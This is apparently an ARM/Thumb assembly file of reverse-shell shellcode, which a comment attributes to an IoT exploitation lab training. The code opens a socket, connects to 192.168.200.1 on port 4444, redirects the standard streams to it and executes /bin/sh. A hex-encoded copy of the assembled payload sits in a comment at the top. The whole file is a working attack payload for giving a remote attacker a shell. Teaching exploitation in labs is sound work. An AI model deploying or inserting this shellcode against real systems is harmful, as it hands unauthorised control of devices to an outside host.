.section .text
.global _start

/*
\x01\x10\x8f\xe2\x11\xff\x2f\xe1\x02\x20\x01\x21\x52\x40\xc8\x27\x51\x37\x01\xdf\x04\x1c\x02\x37\x0a\xa1
\x4a\x70\x10\x22\x01\xdf\x3f\x27\x20\x1c\x02\x21\x01\xdf\x20\x1c\x01\x39\x01\xdf\x20\x1c\x01\x39\x01\xdf
\x05\xa0\x52\x40\xc2\x71\x05\xb4\x69\x46\x0b\x27\x01\xdf\xc0\x46\x02\xff\x11\x5c\xc0\xa8\xc8\x01\x2f\x62
\x69\x6e\x2f\x73\x68\x58
*/

/* Shellcode used for @therealsaumil 's IoT exploitation lab training (offensivecon19) */

_start:
	adr	r1, THUMB+1
	bx 	r1

THUMB:
.code 16
	/* socket part */
	mov 	r0, #2
	mov	r1, #1 
	eor	r2, r2, r2

	mov	r7, #200
	add	r7, #81	

	/* invoke syscall for socket */
	svc	#1
	
	/* get returned value to obtain fd id */
	mov 	r4, r0

	/* connect part */
	mov 	r0, r4 /* get fd/socket id */
	adr	r1, ADDR
	mov	r2, #16
	mov	r7, #200
	add	r7, #83
	svc 	#1
	mov	r4, r0
	
	/* file descriptors part (dup2) */	
	mov	r0, r4
	mov	r1, #2
	mov 	r7, #63
	svc	#1

	mov 	r0, r4
	mov 	r1, #1
	mov 	r7, #63
	svc 	#1

	mov 	r0, r4
	mov	r1, #0
	mov	r7, #63
	svc 	#1

	/* shell part */
	adr 	r0, BINSH
	eor 	r2, r2, r2	
	strb	r2, [r0, #7]	
	push	{r0, r2}
	mov r1, sp
	mov 	r7, #11
	svc 	#1 	

.balign 4

ADDR:
.byte 0x02,0xff 
.byte 0x11,0x5c
.byte  192,168,200,1

BINSH:
.ascii "/bin/shX"
